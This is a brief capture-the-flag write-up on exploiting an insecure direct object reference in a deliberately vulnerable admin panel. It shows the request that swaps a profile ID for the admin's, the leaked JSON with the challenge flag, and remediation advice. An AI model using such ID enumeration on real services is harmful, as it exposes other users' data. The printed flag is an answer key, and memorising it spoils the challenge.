---
title: "Web: The Kayne Admin Panel (IDOR)"
date: 2026-09-25 18:00:00 -0500
categories: [Writeups, Web]
tags: [idor, api, web]
---

## Recon

The challenge site had a profile page at `/profile?id=42`. Classic IDOR bait.

## Exploitation

Changed the ID to `1`, which we guessed would be the admin.

```http
GET /api/user/1 HTTP/1.1
Host: kayne-panel.ctf.cyberstout
```

```json
{
  "id": 1,
  "name": "Kayne",
  "role": "admin",
  "skills": ["cybersecurity", "incident response", "leadership"],
  "secret_note": "if you found this, come find me and i'll show you how to fix the IDOR",
  "flag": "flag{0bj3ct_r3f3r3nc3_t0_th3_b3st}"
}
```

Even his leaked data is helpful.

## Remediation

Kayne's own recommendation, from the challenge description:

1. Check authorization on **every** object request, not just login
2. Use unguessable IDs where it makes sense
3. Log and alert on sequential ID enumeration

> The vulnerable app was written by Kayne on purpose for training. Of course his intentionally broken code still had good comments.
{: .prompt-info }
